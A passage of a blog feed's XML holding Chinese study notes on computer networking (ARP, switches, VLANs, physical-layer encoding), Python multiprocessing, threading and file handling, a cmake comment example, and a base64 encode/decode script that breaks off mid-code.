alt="image-20231101113959921"></p><p>在网络层首部中右源IP地址和目标IP地址</p><p>在数据链路层的首部中有源MAC地址和目标IP地址 </p><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>就是用于使用Ip地址发现mac地址</p><p>用于使用IP发现mac地址</p><p>通过广播查询，然后ip匹配的地址就会记录到arp高速缓存表</p><p><strong>arp只能在一个链路和一个网络之间只用，不能跨网络使用</strong></p><p>存在arp欺骗的问题</p><h1 id="集线器和交换机"><a href="#集线器和交换机" class="headerlink" title="集线器和交换机"></a>集线器和交换机</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106141538494.png" alt="image-20231106141538494"></p><h2 id="交换机和集线器的区别"><a href="#交换机和集线器的区别" class="headerlink" title="交换机和集线器的区别"></a>交换机和集线器的区别</h2><p>交换机可以指定一个主机交流</p><p>集线器会使用一种类似广播的形式也就是说每一个用户都会接受到信息</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106142039698.png" alt="image-20231106142039698"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106142310810.png" alt="image-20231106142310810"></p><p>交换机会扩大广播域但是不会扩展碰撞域</p><p>集线器会扩展广播域同时也会扩展碰撞域</p><p><strong>交换机工作在主要数据链路层，集线器工作在物理层</strong></p><h1 id="以太网交换机自学习和转发帧的流程"><a href="#以太网交换机自学习和转发帧的流程" class="headerlink" title="以太网交换机自学习和转发帧的流程"></a>以太网交换机自学习和转发帧的流程</h1><ol><li><p>交换机插上网线就能使用，最开始的时候帧转发表是空的，但是要能连上网，就会自己存储转发表</p></li><li><p>帧交换表不会永久存放，到一定的时间之后就会消除</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106143323621.png" alt="image-20231106143323621"></p><p>因为mac地址也交换机接口的对应关系不是永久性的</p></li><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106143642085.png" alt="image-20231106143642085"></p><p>mac地址就是物理地址工作在数据链路层</p></li></ol><h1 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h1><ol><li>用于防止添加冗余，生成的网络环</li></ol><h1 id="虚拟局域网-VLAN"><a href="#虚拟局域网-VLAN" class="headerlink" title="虚拟局域网(VLAN)"></a>虚拟局域网(VLAN)</h1><ol><li><p>随着交换机的增多，广播域也变大，就会造成很多问题</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106144543701.png" alt="image-20231106144543701"></p><ul><li>当某一个主机获取mac地址，使用arp协议的时候就会广播所有的域</li></ul></li><li><p>网络上大量使用广播</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106144739764.png" alt="image-20231106144739764"></p></li><li><p>同一个VLAN可以广播通信，不同的VLAN不能广播通信</p></li></ol><p>   <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106145924298.png" alt="image-20231106145924298"></p><ol start="4"><li><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106150151949.png" alt="image-20231106150151949"></p></li><li><p>ACCESS端口<br><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106150459459.png" alt="image-20231106150459459"></p><p>access端口将会对没打标签的打标签，打标签的去标签，如果与自己的PVID相等的话就转发该帧</p><p>连接主机的端口应该设置为ACCESS</p></li><li><p>TRUNK端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106150955022.png" alt="image-20231106150955022"></p><p>对于这个转发机制，适用于不同VLAN之间的转发</p></li><li><p>Hybrid端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/image-20231106151426644.png" alt="image-20231106151426644"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mysql随记</title>
    <link href="/2023/10/25/MYSQL/mysql%E9%9A%8F%E8%AE%B0/"/>
    <url>/2023/10/25/MYSQL/mysql%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<ol><li><p>order by 放在后面</p></li><li><p>函数声明解析参数的时候下面的格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>(<span class="hljs-params">pass1</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    :pass1: ...</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/%E9%9A%8F%E8%AE%B0/image-20231027003241652.png" alt="image-20231027003241652"></p></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>MYSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进程和线程</title>
    <link href="/2023/10/23/python/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/"/>
    <url>/2023/10/23/python/%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="python里面的多进程"><a href="#python里面的多进程" class="headerlink" title="python里面的多进程"></a>python里面的多进程</h1><h2 id="unix和linux"><a href="#unix和linux" class="headerlink" title="unix和linux"></a>unix和linux</h2><ol><li><p>使用fork()  来调用系统创建一个进程</p><p>这样创建的进程是一个子进程，拷贝的父进程的</p><p>但是子进程都存在自己的PID</p><p>fork的它可以做到返回两次</p><p>在父进程里fork返回的是子进程的PID，在子进程里返回的永远都是0</p></li></ol><h2 id="win"><a href="#win" class="headerlink" title="win"></a>win</h2><ol><li><p>multiprocessing</p><p>使用这个model里面的Process创建子进程</p><p>并且在这个里面还进行了更高级的封装</p><p>进程池(pool)  消息队列(Queue)  管道(Pipe)</p></li><li><p>下面是一段对比</p><p><strong>不适用多进程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><br><br><span class="hljs-comment"># 不使用多进程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_out</span>():<br>    start = time()<br>    <span class="hljs-built_in">all</span> = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>):<br>        <span class="hljs-built_in">all</span> = <span class="hljs-built_in">all</span> * i<br>        <span class="hljs-comment"># print(all)</span><br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗的时间为 ：<span class="hljs-subst">&#123;end-start&#125;</span>\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    work_out()<br>    work_out()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗时间为:<span class="hljs-subst">&#123;end-start&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><blockquote><p>消耗的时间为 ：2.4721951484680176</p><p>消耗的时间为 ：2.4349334239959717</p><p>消耗时间为:4.907128572463989</p></blockquote><p><strong>使用多进程</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time, sleep<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><br><span class="hljs-comment"># 使用多进程</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work_out</span>():<br>    start = time()<br>    <span class="hljs-built_in">all</span> = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>):<br>        <span class="hljs-built_in">all</span> = <span class="hljs-built_in">all</span> * i<br>        <span class="hljs-comment"># print(all)</span><br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗的时间为 ：<span class="hljs-subst">&#123;end-start&#125;</span>\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    start = time()<br>    p1 = Process(target=work_out)<br>    p1.start()<br>    p2 = Process(target=work_out)<br>    p2.start()<br>    p1.join()<br>    p2.join()<br>    end = time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;消耗时间为:<span class="hljs-subst">&#123;end-start&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><blockquote><p>消耗的时间为 ：3.135038137435913</p><p>消耗的时间为 ：3.1490530967712402</p><p>消耗时间为:3.279216766357422</p></blockquote></li><li><p>也可以使用subprocess模块中类</p><p>创建子进程，然后子进程之间可以访问</p></li></ol><h1 id="python里的多线程"><a href="#python里的多线程" class="headerlink" title="python里的多线程"></a>python里的多线程</h1><ol><li><p>主要使用的是<code>threading</code>来实现多线程</p></li><li><p>多线程之间可以通信，因为共用，但是就会面临一个新的问题</p><p>如果两个线程同时访问一个全局变量会发生什么结果？</p><p>这个变量称为竞争变量</p></li><li><p>加锁解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><br>i = <span class="hljs-number">0</span><br>total = <span class="hljs-number">0</span><br>lock = Lock()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">work</span>():<br>    <span class="hljs-keyword">global</span> i, total<br><br>    <span class="hljs-keyword">while</span> i != <span class="hljs-number">101</span>:<br>        lock.acquire()<br>        total += i<br>        i += <span class="hljs-number">1</span><br>        lock.release()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    t1 = Thread(target=work)<br>    t1.start()<br>    t2 = Thread(target=work)<br>    t2.start()<br><br>    t1.join()<br>    t2.join()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;结果是: <span class="hljs-subst">&#123;total&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure></li></ol><h1 id="python里面的协程"><a href="#python里面的协程" class="headerlink" title="python里面的协程"></a>python里面的协程</h1><ol><li>优势<ul><li>运行效率极高</li><li>可以在单核单线程里面处理异步操作</li><li>不需要锁机制</li></ul></li><li>如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>物理层</title>
    <link href="/2023/10/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E5%B1%82/"/>
    <url>/2023/10/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%89%A9%E7%90%86%E5%B1%82/</url>
    
    <content type="html"><![CDATA[<h1 id="物理层的基本概念"><a href="#物理层的基本概念" class="headerlink" title="物理层的基本概念"></a>物理层的基本概念</h1><ol><li>处理比特流</li></ol><h2 id="物理层的主要任务"><a href="#物理层的主要任务" class="headerlink" title="物理层的主要任务"></a>物理层的主要任务</h2><ol><li>机械特性</li><li>电气特性</li><li>功能特性</li><li>过程特性</li></ol><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023142138991.png" alt="image-20231023142138991"></p><h2 id="物理层下面的传输媒体"><a href="#物理层下面的传输媒体" class="headerlink" title="物理层下面的传输媒体"></a>物理层下面的传输媒体</h2><ol><li>导引型传输媒体<ul><li>同轴电缆</li><li>双绞线  </li><li>光纤</li><li>电力线</li></ul></li><li>非导引型传输媒体<ul><li>无线电波</li><li>微波</li><li>红外线</li><li>可见光</li></ul></li></ol><h1 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023143215057.png" alt="image-20231023143215057"></p><ul><li>串行传输</li><li>并行传输</li><li>同步传输</li><li>异步传输</li><li>单向通信（单工）</li><li>双向交替通信（半双工）</li><li>双向通信（全双工）</li></ul><h1 id="编码与解调"><a href="#编码与解调" class="headerlink" title="编码与解调"></a>编码与解调</h1><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023143954827.png" alt="image-20231023143954827"></p><ol><li>调制后采用的是模拟信号</li></ol><h2 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023150323318.png" alt="image-20231023150323318"></p><h2 id="常用的编码方法"><a href="#常用的编码方法" class="headerlink" title="常用的编码方法"></a>常用的编码方法</h2><ul><li><p>不归零编码</p><p>存在同步问题，所以计算机里面不使用这种编码</p></li><li><p>归零编码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023150625986.png" alt="image-20231023150625986"></p><p>这样编码会造成数据带宽浪费的问题，因为大部分都用来存储“归零”而浪费</p></li><li><p>曼厠斯蒂编码</p><p>码元中间的跳变即表示时钟又表示数据</p><p>可以理解为同一个方向是一同一类信号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023150951418.png" alt="image-20231023150951418"></p></li><li><p>差分曼厠斯蒂编码</p><p>根据码元开始处是否发生变化来表示数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023151102672.png" alt="image-20231023151102672"></p></li></ul><h2 id="常用的调制方法"><a href="#常用的调制方法" class="headerlink" title="常用的调制方法"></a>常用的调制方法</h2><p>将数字信号转变成电子信号</p><h1 id="通道的极限通量"><a href="#通道的极限通量" class="headerlink" title="通道的极限通量"></a>通道的极限通量</h1><ul><li>奈氏准则</li><li>香农公式</li></ul><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/ComputerNetwork/%E8%AE%A1%E7%BD%91%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image-20231023151718565.png" alt="image-20231023151718565"></p>]]></content>
    
    
    
    <tags>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmake</title>
    <link href="/2023/10/19/cmake/cmake/"/>
    <url>/2023/10/19/cmake/cmake/</url>
    
    <content type="html"><![CDATA[<h1 id="注释行"><a href="#注释行" class="headerlink" title="注释行"></a>注释行</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment"># 这个是注释行</span><br><span class="hljs-comment">#[[</span><br><span class="hljs-comment">块注释</span><br><span class="hljs-comment">]]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>cmake</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件和异常</title>
    <link href="/2023/10/19/python/%E6%96%87%E4%BB%B6%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
    <url>/2023/10/19/python/%E6%96%87%E4%BB%B6%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><p>文件操作很简单就是一个open函数，但是我们需要先了解一下打开权限的问题</p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><table><thead><tr><th>操作模式</th><th>具体含义</th></tr></thead><tbody><tr><td>r</td><td>读权限</td></tr><tr><td>w</td><td>写权限（会更新内容）</td></tr><tr><td>x</td><td>文件存在就会抛出异常</td></tr><tr><td>a</td><td>追加模式</td></tr><tr><td>b</td><td>二进制模式</td></tr><tr><td>t</td><td>文本模式</td></tr><tr><td>+</td><td>更新（可读可写）</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ?文件操作学习请注意</span><br><br><span class="hljs-comment"># 首先创建一个文本，我们使用&#x27;w&#x27;模式没有的话就会创建一个</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;wxLearn.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 没有的话就会创建一个</span><br>    inputStr = <span class="hljs-string">&quot;wxLearn&quot;</span><br>    f.write(inputStr)<br><span class="hljs-comment"># !这样使用会自动close</span><br><br><span class="hljs-comment"># 普通的使用方法</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;wxLearn.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>outputStr = f.readline()<br><span class="hljs-built_in">print</span>(outputStr)<br>f.close()  <span class="hljs-comment"># !一定要close</span><br><br></code></pre></td></tr></table></figure><h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><p>利用异常编写出base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> abc <span class="hljs-keyword">import</span> abstractclassmethod, ABCMeta<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EnAndDecode</span>(metaclass=ABCMeta):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>():<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">    @abstractclassmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>():<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base64</span>(<span class="hljs-title class_ inherited__">EnAndDecode</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__()<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">try</span>:<br>            base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            answer = base64.b64encode(base64_bytes)<br>            <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-comment"># 当运行出错</span><br>            <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">string</span>) -&gt; <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">try</span>:<br>            base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            answer = base64.b64decode(base64_bytes)<br>            <span class="hljs-keyword">return</span> answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_n</span>(<span class="hljs-params">string, n</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>            <span class="hljs-keyword">try</span>:<br>                base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                answer = base64.b64encode(base64_bytes)<br>                string = answer.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">return</span> string<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_n</span>(<span class="hljs-params">string</span>):<br>        count = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                base64_bytes = string.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                string = base64.b64decode(base64_bytes)<br>                string = string.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>                count += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> string, count<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>():<br>    <span class="hljs-built_in">print</span>(<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">          1. base64加密</span><br><span class="hljs-string">          2. base64解密</span><br><span class="hljs-string">          3. base64加密n次</span><br><span class="hljs-string">          4. base64解密n次&quot;&quot;&quot;</span><br>    )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOption</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        option = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;你的选择是什么？:&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            option = <span class="hljs-built_in">int</span>(option)<br>            <span class="hljs-keyword">if</span> option <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]:<br>                <span class="hljs-keyword">return</span> option<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请输入正确的选项&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;请输入正确的选项&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># 菜单</span><br>    menu()<br>    <span class="hljs-comment"># 选项</span><br>    option = 